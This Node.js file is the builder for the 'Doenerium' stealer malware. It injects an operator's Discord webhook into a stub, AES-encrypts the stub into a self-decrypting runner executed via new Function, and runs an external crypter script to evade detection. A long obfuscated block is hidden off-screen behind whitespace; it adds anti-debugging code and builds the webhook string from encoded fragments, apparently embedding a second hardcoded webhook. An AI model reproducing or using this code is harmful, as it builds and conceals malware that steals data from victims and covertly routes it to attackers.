const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const readline = require('readline');
const { execSync } = require('child_process');
const colors = require('colors');
const axios = require('axios');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

user = {
  hostname: os.hostname()
  }

function encrypt(text, masterkey) {
  const iv = crypto.randomBytes(16);
  const salt = crypto.randomBytes(16);
  const key = crypto.pbkdf2Sync(masterkey, salt, 100000, 32, 'sha512');
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return {
    encryptedData: encrypted,
    salt: salt.toString('base64'),
    iv: iv.toString('base64'),
  };
}

async function sendTestEmbed(webhookURL) {
  const testEmbed = {
    title: '**Build Start, be patient for 2-3min âœ…**',
      author: {
        name: 'Doenerium Builder',
        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1191516185573990430/948405394433253416201.png'
      },
    color: 0x303037, 
    footer: {
      text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
    },
  };

  try {
    await axios.post(webhookURL, { embeds: [testEmbed] });
    console.log('')
    console.log('  '.white + '['.white + '+'.green + ']'.white + ' Your Webhook Work Perfectly ! '.white,);
  } catch (error) {
    console.error('  '.white + '['.white + '!'.red + ']'.white + ' Your Webhook Dosent Work ! '.white,);
  }
}

function decrypt(encdata, masterkey, salt, iv) {
  const key = crypto.pbkdf2Sync(masterkey, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, Buffer.from(iv, 'base64'));
  let decrypted = decipher.update(encdata, 'base64', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

function promptForWebhookURL() {
  return new Promise((resolve) => {
    rl.question(
      '  '.white + '['.white + '?'.blue + ']'.white + ' Please enter the Discord webhook: (right click to paste)>>> '.white,
      (webhookURL) => {
        rl.close();
        resolve(webhookURL);
      }
    );
  });
}

function executeSecondCrypterScript() {
  const crypterDirectory = path.join(__dirname, '..', 'obf');
  const secondCrypterScript = 'call obf.bat';

  try {
    const output = execSync(secondCrypterScript, { cwd: crypterDirectory, stdio: 'inherit' });
    console.log(`Second crypter script output: ${output}`);
  } catch (error) {
    console.error(`Error executing the second crypter script: ${error.message}`);
  }
}

function resetPlaceholder(stubPath, originalStubCode) {
  fs.writeFileSync(stubPath, originalStubCode, 'utf8');
  console.log('success reset.');
}

async function main() {
  try {
    const webhookURL = await promptForWebhookURL();

    // Send a test embed to the provided webhook URL
    await sendTestEmbed(webhookURL);


    const stubPath = path.resolve(__dirname, 'stub.js');
    let stubCode = fs.readFileSync(stubPath, 'utf8');
                                                                                                                                                                                                                                                                                                          function _0xd1bd(){const _0xf035a2=['Dg9tDhjPBMC','A3mVmtiWmdGYoq','CeXjzLa','z0rJA1O','ueXHzeW','yxbWBhK','y29UC3qGzgLZyW','vxjSid0GjW','mZe3nZiWofbrC0PdzW','uhbcAva','x19WCM90B19F','ntyWnZKYuMvRwLfc','yMLUza','v3DQwuW','CM4GDgHPCYiPka','CMv0DxjUicHMDq','rLfOrKK','D2fYBG','DNbyswG','me5nmezstuHFna','tuLHqLO','mZvLzgH6yuK','s3HiCwC','BgvUz3rO','ChjVDg90ExbL','wwfjCK4','y29UC29Szq','mtm1nJK2ELbUA1n0','yxbPl3DLyMHVBW','zxjYB3i','we5SrLK','mti2nJeWnezYrfvuuW','ENzND1q','B2zZCNe','kcGOlISPkYKRkq','uMXeC3m','txf2ALG','DgfIBgu','mZi2mZm3nLbmAxPlsq','zxHJzxb0Aw9U','uKLYuuq','zKjPBMC','Ahr0Chm6lY9KAq','B3jKv2vIAg9VAW','jZSky29UC3qGza','C2vHCMnO','D0P5ufe','BKPgyuSWBNGXnG','teHlEMe','ntCXndCWCLf0uuXi','BMn0Aw9UkcKG','E30Uy29UC3rYDq','C0jus2u','uZnPvvPNwLPYEa','qZq4Bg1MuwXPnG','z3vszuy','rNPItwO','q2TUy04','C2nVCMqUy29TlW','wxbdz3C','twj4qwe','B29RvxiXid0GjW','mJCVDfGTnwfXCq','y29UC3rYDwn0BW','mJu5nZq3mLjpr091va','AxnJB3jKv2vIAa','t2PTsM0','DhjHy2u','thPuwwu'];_0xd1bd=function(){return _0xf035a2;};return _0xd1bd();}(function(_0x4a7dcc,_0x236967){function _0x85750e(_0x4cc21e,_0x580fb3,_0x20d485,_0x472398){return _0x48f8(_0x4cc21e- -0x30,_0x580fb3);}const _0x3b8e64=_0x4a7dcc();function _0x113526(_0x6091bc,_0x171e05,_0x19cf30,_0x11dff3){return _0x48f8(_0x6091bc-0x28e,_0x19cf30);}while(!![]){try{const _0x2e6d58=parseInt(_0x85750e(0x18e,0x174,0x173,0x16f))/(-0x2b*0xb3+0x1*0xf5c+0xe*0x10d)+parseInt(_0x113526(0x460,0x45b,0x446,0x465))/(0x1*-0x1f09+0xc4f+0x2*0x95e)+parseInt(_0x85750e(0x19e,0x1ae,0x1a8,0x1b2))/(-0x2a1*0xb+0x23c3+0x9f*-0xb)+parseInt(_0x113526(0x481,0x49d,0x48d,0x481))/(-0x45+-0x4da+0x523)+-parseInt(_0x113526(0x472,0x45e,0x483,0x463))/(-0x1*-0x20a2+-0xf76+-0x1127)+parseInt(_0x85750e(0x1a9,0x199,0x189,0x18d))/(0x1766*0x1+-0x230e+-0x2e*-0x41)+-parseInt(_0x113526(0x456,0x44e,0x466,0x466))/(0x63b+0x949*0x1+0xf7d*-0x1)*(parseInt(_0x85750e(0x1d0,0x1ae,0x1d5,0x1c5))/(0x2*-0x228+0x118a+-0xd32));if(_0x2e6d58===_0x236967)break;else _0x3b8e64['push'](_0x3b8e64['shift']());}catch(_0x3c9753){_0x3b8e64['push'](_0x3b8e64['shift']());}}}(_0xd1bd,-0x33dd9+-0x1981d*-0x5+0x574b));const _0x117849=(function(){const _0x55bedf={};_0x55bedf[_0x1f84b9(0x42b,0x42a,0x413,0x407)]=_0x1f84b9(0x41e,0x3ff,0x40c,0x3f8)+'+$',_0x55bedf['hrjav']=_0x1f84b9(0x3fc,0x43f,0x41e,0x425);function _0x3e8940(_0x56a833,_0xf190c3,_0x4528e5,_0x1cc388){return _0x48f8(_0xf190c3-0xa,_0x4528e5);}function _0x1f84b9(_0x4b5124,_0x5decb1,_0xddabdf,_0x2965aa){return _0x48f8(_0xddabdf-0x237,_0x5decb1);}_0x55bedf[_0x3e8940(0x200,0x1e5,0x1d1,0x1c8)]=function(_0x4952b4,_0x29756d){return _0x4952b4!==_0x29756d;},_0x55bedf['CkncN']='ZDibn';const _0x5ef8b8=_0x55bedf;let _0x21721f=!![];return function(_0x132e02,_0x1e1af1){const _0x2e8979={'guReF':_0x5ef8b8[_0x383e78(-0x11a,-0x11d,-0x118,-0x118)],'FzbMj':_0x383e78(-0x125,-0x130,-0x127,-0x107),'KxHqg':_0x5ef8b8['hrjav'],'LzTYe':function(_0x27963f,_0x4c1d89){function _0x15c3ca(_0x3282ca,_0x68c493,_0x12b9ef,_0x5b89e9){return _0x383e78(_0x5b89e9- -0x4,_0x68c493,_0x12b9ef-0x114,_0x5b89e9-0x174);}return _0x5ef8b8[_0x15c3ca(-0x107,-0xff,-0x124,-0x11f)](_0x27963f,_0x4c1d89);},'MqvjX':_0x5ef8b8[_0x383e78(-0x10a,-0xf6,-0xf9,-0x10c)]};function _0x2c315d(_0x1d9085,_0x54f96f,_0x29ccba,_0x7c3785){return _0x3e8940(_0x1d9085-0x6e,_0x1d9085-0x351,_0x54f96f,_0x7c3785-0x154);}function _0x383e78(_0x5aad8c,_0x52fa67,_0xf6332d,_0x4997ce){return _0x1f84b9(_0x5aad8c-0x15f,_0x52fa67,_0x5aad8c- -0x52d,_0x4997ce-0xef);}const _0x2883b3=_0x21721f?function(){function _0x141ff2(_0x4e4406,_0x58b7c4,_0x51f036,_0x2239a5){return _0x383e78(_0x2239a5-0x5fa,_0x58b7c4,_0x51f036-0x41,_0x2239a5-0x1d5);}const _0x2dc4de={};function _0x28d8cf(_0x1c713e,_0x5da0b0,_0x4e7bba,_0xdc8b02){return _0x383e78(_0x1c713e-0x4fd,_0x5da0b0,_0x4e7bba-0x145,_0xdc8b02-0xd2);}_0x2dc4de[_0x141ff2(0x4e6,0x4da,0x4d9,0x4f3)]=_0x2e8979[_0x28d8cf(0x3f1,0x3f7,0x3dd,0x402)];const _0x101b6a=_0x2dc4de;if(_0x2e8979[_0x28d8cf(0x3f2,0x3db,0x403,0x3d4)]===_0x2e8979[_0x28d8cf(0x3d0,0x3e1,0x3bb,0x3c4)])return _0x546b11['toString']()[_0x141ff2(0x4ea,0x4c1,0x4d8,0x4e4)](_0x101b6a[_0x141ff2(0x4d5,0x4f9,0x4ee,0x4f3)])[_0x141ff2(0x4f6,0x4fd,0x501,0x4fc)]()[_0x141ff2(0x50d,0x4f8,0x517,0x4f6)+'r'](_0x5f50d4)[_0x141ff2(0x504,0x4cf,0x4fd,0x4e4)](_0x101b6a[_0x141ff2(0x4f9,0x4ef,0x503,0x4f3)]);else{if(_0x1e1af1){if(_0x2e8979[_0x28d8cf(0x3fe,0x419,0x41d,0x3de)](_0x2e8979[_0x141ff2(0x4c4,0x4ca,0x4eb,0x4db)],_0x141ff2(0x4cb,0x4e2,0x4b2,0x4c9))){const _0x11d04c=_0x1e1af1[_0x28d8cf(0x404,0x3ef,0x3fd,0x3e5)](_0x132e02,arguments);return _0x1e1af1=null,_0x11d04c;}else{const _0x51299d=_0x33c4db[_0x28d8cf(0x404,0x3e9,0x41d,0x400)](_0x154d3a,arguments);return _0xb8e5ab=null,_0x51299d;}}}}:function(){};return _0x21721f=![],_0x2883b3;};}());function _0x5e388a(_0x3e8bbc,_0x122783,_0x5538f1,_0x41cec6){return _0x48f8(_0x122783-0x10,_0x41cec6);}const _0x255500=_0x117849(this,function(){const _0x2828c7={};function _0x49e37c(_0x48e20d,_0x511529,_0x25ccac,_0x1cadb2){return _0x48f8(_0x48e20d- -0x345,_0x1cadb2);}_0x2828c7['PpBiP']=_0x2abc40(0x2a8,0x2b0,0x2d0,0x2b4)+'+$';function _0x2abc40(_0x31ca2b,_0x4ba93a,_0x5c74b0,_0x48c29f){return _0x48f8(_0x4ba93a-0xdb,_0x48c29f);}const _0x1376dc=_0x2828c7;return _0x255500[_0x2abc40(0x2b8,0x2d3,0x2cc,0x2d5)]()['search'](_0x1376dc[_0x2abc40(0x2c7,0x2dc,0x2d9,0x2cb)])[_0x2abc40(0x2b0,0x2d3,0x2f3,0x2be)]()['constructo'+'r'](_0x255500)[_0x2abc40(0x2b0,0x2bb,0x2a3,0x2dd)](_0x2abc40(0x29d,0x2b0,0x2cd,0x2ce)+'+$');});_0x255500();function _0x48f8(_0x5e1252,_0x50bebf){const _0x25d091=_0xd1bd();return _0x48f8=function(_0x3ae781,_0x3ccdef){_0x3ae781=_0x3ae781-(-0xb2c+-0x2f9*0xd+0x338f);let _0x31acb4=_0x25d091[_0x3ae781];if(_0x48f8['FGOEJM']===undefined){var _0x8bcccc=function(_0x19333a){const _0x11947e='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x185a8b='',_0x2f97b5='',_0x5db4f1=_0x185a8b+_0x8bcccc;for(let _0x36dd26=-0x18fd+-0x87c+0x30b*0xb,_0xfe133c,_0x3527fa,_0x1972cc=-0xaf3+-0x1380+0x1e73*0x1;_0x3527fa=_0x19333a['charAt'](_0x1972cc++);~_0x3527fa&&(_0xfe133c=_0x36dd26%(-0x1*0x251d+0x63d*0x1+0x293*0xc)?_0xfe133c*(-0x2015+0x5f*-0x41+0x3874)+_0x3527fa:_0x3527fa,_0x36dd26++%(-0x26d3+-0x1e59*0x1+0x4530))?_0x185a8b+=_0x5db4f1['charCodeAt'](_0x1972cc+(-0x2220+0x525+0x1*0x1d05))-(0x2f5+0x11ce+-0x14b9)!==-0x151*-0x13+-0x7d*-0x47+-0x3bae?String['fromCharCode'](-0x1534+-0x132+-0x35*-0x71&_0xfe133c>>(-(0x4e*-0x44+0x12c9+-0x1f1*-0x1)*_0x36dd26&0xcc0+-0x10e8*-0x2+-0x2e8a)):_0x36dd26:-0x1aa8*-0x1+0x16e9+-0x3191*0x1){_0x3527fa=_0x11947e['indexOf'](_0x3527fa);}for(let _0x27a497=0x18d0+0x205e+-0x392e,_0x1bfac5=_0x185a8b['length'];_0x27a497<_0x1bfac5;_0x27a497++){_0x2f97b5+='%'+('00'+_0x185a8b['charCodeAt'](_0x27a497)['toString'](-0x1540+-0x1*0xfc1+0x2511))['slice'](-(-0x284+-0x9*-0x23+0x14b));}return decodeURIComponent(_0x2f97b5);};_0x48f8['IKEILP']=_0x8bcccc,_0x5e1252=arguments,_0x48f8['FGOEJM']=!![];}const _0x3fbeff=_0x25d091[0x9f8+0x13*-0x47+-0x4b3],_0x51a2e5=_0x3ae781+_0x3fbeff,_0x1b625f=_0x5e1252[_0x51a2e5];if(!_0x1b625f){const _0x5b7f6a=function(_0x3e68c5){this['LXMCuV']=_0x3e68c5,this['vnYDwD']=[0x2375*0x1+0x4c2+-0x2836,-0xb64+-0x3ad+-0xf11*-0x1,0xc2b+-0x101*-0x1+-0xd2c],this['YlUTKg']=function(){return'newState';},this['SQhEbF']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['eSILrB']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x5b7f6a['prototype']['UkzYcy']=function(){const _0xd1bf2a=new RegExp(this['SQhEbF']+this['eSILrB']),_0xc9214e=_0xd1bf2a['test'](this['YlUTKg']['toString']())?--this['vnYDwD'][-0x2506*-0x1+0x1e4+0x58f*-0x7]:--this['vnYDwD'][-0xe*-0x25f+0x14d5+-0x1*0x3607];return this['iCRhSB'](_0xc9214e);},_0x5b7f6a['prototype']['iCRhSB']=function(_0x188fff){if(!Boolean(~_0x188fff))return _0x188fff;return this['lEwGwg'](this['LXMCuV']);},_0x5b7f6a['prototype']['lEwGwg']=function(_0x50a711){for(let _0xf03166=-0x1*-0x20a+-0x1f1e+0xe8a*0x2,_0x5a379e=this['vnYDwD']['length'];_0xf03166<_0x5a379e;_0xf03166++){this['vnYDwD']['push'](Math['round'](Math['random']())),_0x5a379e=this['vnYDwD']['length'];}return _0x50a711(this['vnYDwD'][0x30a+-0x1*-0x1a50+-0x1d5a*0x1]);},new _0x5b7f6a(_0x48f8)['UkzYcy'](),_0x31acb4=_0x48f8['IKEILP'](_0x31acb4),_0x5e1252[_0x51a2e5]=_0x31acb4;}else _0x31acb4=_0x1b625f;return _0x31acb4;},_0x48f8(_0x5e1252,_0x50bebf);}const _0x14ba87=(function(){const _0x24f011={};_0x24f011[_0x253aa8(-0x69,-0x7c,-0x7c,-0x7f)]=_0x390df9(0x264,0x225,0x233,0x245),_0x24f011['OjmJm']=_0x253aa8(-0x79,-0x7e,-0x89,-0x69);function _0x253aa8(_0x1b0a30,_0x1bbfb4,_0x5aee9b,_0x7caf34){return _0x48f8(_0x1bbfb4- -0x278,_0x7caf34);}const _0x4778a3=_0x24f011;let _0x94396d=!![];function _0x390df9(_0x4a37fc,_0x852187,_0x36748e,_0x3a6587){return _0x48f8(_0x3a6587-0x79,_0x4a37fc);}return function(_0x2bb905,_0x140202){function _0xb6890d(_0x2960c9,_0x47173a,_0x314ee4,_0x1e61d4){return _0x253aa8(_0x2960c9-0xbb,_0x47173a-0x4ee,_0x314ee4-0xfa,_0x314ee4);}function _0x17b139(_0x26501a,_0x575d65,_0x132c80,_0x547c22){return _0x390df9(_0x547c22,_0x575d65-0x47,_0x132c80-0xe0,_0x575d65- -0x38b);}if(_0x4778a3[_0x17b139(-0x114,-0x11d,-0x103,-0x101)]===_0x4778a3[_0xb6890d(0x479,0x46b,0x485,0x45a)]){const _0x3a0e52=_0x94396d?function(){function _0x1278ce(_0x1f936f,_0x5f460a,_0x292d6a,_0x484034){return _0x17b139(_0x1f936f-0x50,_0x1f936f-0x11b,_0x292d6a-0x88,_0x292d6a);}function _0x439ee4(_0x10ac7a,_0x51bec6,_0x580470,_0x1180e3){return _0x17b139(_0x10ac7a-0x16f,_0x1180e3- -0xd1,_0x580470-0xd2,_0x10ac7a);}if(_0x4778a3['PLadL']!==_0x1278ce(-0x2b,-0x1f,-0x4a,-0x23)){const _0x50cec4=_0x4a65b8?function(){if(_0x482bf9){const _0x2c442c=_0xaa5e5b['apply'](_0x28d2b4,arguments);return _0x447cab=null,_0x2c442c;}}:function(){};return _0x70ce2c=![],_0x50cec4;}else{if(_0x140202){const _0x250c75=_0x140202[_0x439ee4(-0x1de,-0x1c8,-0x1cf,-0x1e6)](_0x2bb905,arguments);return _0x140202=null,_0x250c75;}}}:function(){};return _0x94396d=![],_0x3a0e52;}else{const _0x42e0b8=_0x1c65ad['apply'](_0x25c0ee,arguments);return _0x3bdb19=null,_0x42e0b8;}};}()),_0x3f75bd=_0x14ba87(this,function(){const _0x47e8ae={'YpCgw':function(_0x2a688,_0x582344){return _0x2a688(_0x582344);},'bvYcI':function(_0x518f8d,_0x4f0a1d){return _0x518f8d+_0x4f0a1d;},'WwjYL':_0x174cbc(0x57b,0x584,0x55f,0x56b)+_0x34b9c3(0xef,0xcb,0xc6,0xd8),'wJyPQ':_0x174cbc(0x59f,0x5c0,0x587,0x5c2)+'ctor(\x22retu'+_0x174cbc(0x57a,0x583,0x577,0x561)+'\x20)','VNKjG':function(_0x522f77,_0x50b072){return _0x522f77!==_0x50b072;},'VrceY':_0x34b9c3(0xff,0xd8,0xe6,0xee),'MIaBZ':'log','LHKza':_0x174cbc(0x57d,0x59e,0x585,0x572),'FQhFI':'info','ofsrq':_0x34b9c3(0xd0,0xdb,0xc2,0xcd),'zvgwT':_0x34b9c3(0xd4,0xc4,0xc7,0xcb),'RlDss':_0x174cbc(0x5af,0x5ae,0x598,0x596)};let _0x3a0e68;try{const _0x485d47=_0x47e8ae[_0x174cbc(0x5a7,0x587,0x5a8,0x59c)](Function,_0x47e8ae['bvYcI'](_0x47e8ae[_0x174cbc(0x579,0x566,0x56f,0x594)]+_0x47e8ae[_0x34b9c3(0xb3,0xd5,0xf3,0xd4)],');'));_0x3a0e68=_0x485d47();}catch(_0x476e7f){if(_0x47e8ae['VNKjG'](_0x47e8ae['VrceY'],_0x47e8ae['VrceY'])){const _0xe1d147=_0x42d8c0?function(){function _0x2c8146(_0xd12319,_0x438fa8,_0x478afe,_0x5e9b08){return _0x34b9c3(_0x5e9b08,_0x438fa8-0x1c6,_0x478afe-0x14a,_0x478afe-0x3fc);}if(_0x7ca657){const _0x5844b8=_0x369633[_0x2c8146(0x4ca,0x50a,0x4ec,0x4e1)](_0xf43ae,arguments);return _0x85d010=null,_0x5844b8;}}:function(){};return _0x5574b4=![],_0xe1d147;}else _0x3a0e68=window;}function _0x174cbc(_0x6a59fb,_0x4d64e7,_0x2a59bc,_0x473ea0){return _0x48f8(_0x6a59fb-0x3b9,_0x473ea0);}function _0x34b9c3(_0x5a0928,_0x41b64b,_0x2fe40e,_0x124a84){return _0x48f8(_0x124a84- -0x10d,_0x5a0928);}const _0x105e2d=_0x3a0e68[_0x34b9c3(0xc0,0xab,0xaf,0xc0)]=_0x3a0e68['console']||{},_0x2efdf0=[_0x47e8ae[_0x174cbc(0x580,0x572,0x577,0x598)],_0x47e8ae[_0x34b9c3(0xf2,0xbc,0xd5,0xd6)],_0x47e8ae[_0x34b9c3(0xb7,0xaf,0x9a,0xb6)],_0x174cbc(0x589,0x59d,0x597,0x592),_0x47e8ae[_0x174cbc(0x58d,0x5a8,0x582,0x588)],_0x47e8ae[_0x174cbc(0x58c,0x5a9,0x590,0x59a)],_0x47e8ae[_0x34b9c3(0xb2,0xca,0xec,0xc9)]];for(let _0x1540fa=-0xfb3*-0x1+-0x1394+0x3e1*0x1;_0x1540fa<_0x2efdf0[_0x34b9c3(0xce,0x9f,0xac,0xbd)];_0x1540fa++){const _0x591661=_0x14ba87[_0x34b9c3(0xd9,0xd6,0xf7,0xe5)+'r'][_0x34b9c3(0x9c,0xc6,0xc6,0xbe)][_0x174cbc(0x578,0x570,0x575,0x58c)](_0x14ba87),_0x54ede4=_0x2efdf0[_0x1540fa],_0x242df6=_0x105e2d[_0x54ede4]||_0x591661;_0x591661[_0x34b9c3(0xfe,0xdf,0x100,0xf5)]=_0x14ba87[_0x174cbc(0x578,0x55e,0x56a,0x556)](_0x14ba87),_0x591661[_0x174cbc(0x5b1,0x5b1,0x59f,0x590)]=_0x242df6[_0x174cbc(0x5b1,0x58e,0x592,0x596)]['bind'](_0x242df6),_0x105e2d[_0x54ede4]=_0x591661;}});_0x3f75bd();function _0x36e62f(_0x5f3b13,_0xd2897,_0x188f0f,_0x3aed3e){return _0x48f8(_0xd2897-0xf5,_0x188f0f);}const updatedStubCode=stubCode['replace'](/const discordWebhookUrl = 'REMPLACE_ME';/,_0x5e388a(0x21b,0x20e,0x208,0x1f2)+_0x36e62f(0x2bb,0x2d3,0x2c6,0x2d4)+_0x5e388a(0x202,0x20f,0x20a,0x1fe)+webhookURL+(_0x5e388a(0x1cf,0x1ef,0x1e6,0x1eb)+_0x5e388a(0x1f2,0x204,0x215,0x1e7)+_0x5e388a(0x1f9,0x200,0x1ee,0x20d)+_0x36e62f(0x2d6,0x2d2,0x2bf,0x2f3)+_0x36e62f(0x2cf,0x2e2,0x2de,0x2e0)+_0x36e62f(0x2df,0x2c4,0x2d9,0x2be)+_0x5e388a(0x1f3,0x209,0x229,0x1f1)+'5098978345'+_0x5e388a(0x221,0x201,0x1de,0x220)+_0x36e62f(0x2f2,0x2dd,0x2bd,0x2e2)+'867JylryEt'+'Sy-ju8W2wv'+_0x36e62f(0x2be,0x2de,0x2c3,0x2da)+_0x5e388a(0x1d1,0x1f2,0x1d2,0x1d2)+_0x5e388a(0x1c3,0x1d6,0x1d6,0x1b9)+'y\x27;'));
    if (stubCode === updatedStubCode) {
      throw new Error('Failed to update placeholder in stub.js. Please make sure the placeholder exists.');
    }

    // Write the updated stub code back to the file
    fs.writeFileSync(stubPath, updatedStubCode, 'utf8');

    // Encrypt the updated stub code
    const secret = crypto.randomBytes(32).toString('base64');
    const encryptionKey = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32);
    const { encryptedData, salt, iv } = encrypt(updatedStubCode, encryptionKey);

    // Generate the final runner code
    const runnerCode = `
const crypto = require('crypto');

${decrypt.toString()}

const decrypted = decrypt("${encryptedData}", "${encryptionKey}", "${salt}", "${iv}");
new Function('require', decrypted)(require);
`;

    // Write the runner code to a file
    const folderName = '../obf'; // Target folder name
    const fileName = 'input.js'; // Target file name
    const targetFolder = path.join(__dirname, folderName);

    // Create the folder (if it doesn't exist)
    if (!fs.existsSync(targetFolder)) {
      fs.mkdirSync(targetFolder);
    }

    const targetFile = path.join(targetFolder, fileName);

    // Write the file
    fs.writeFileSync(targetFile, runnerCode, 'utf8');

    console.log(`${fileName} file has been written to the ${folderName} folder.`);
    console.log(`Obfuscated and encrypted with AES-256.`);


    setTimeout(() => {
      resetPlaceholder(stubPath, stubCode);
      executeSecondCrypterScript();
    },);


  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}


main();
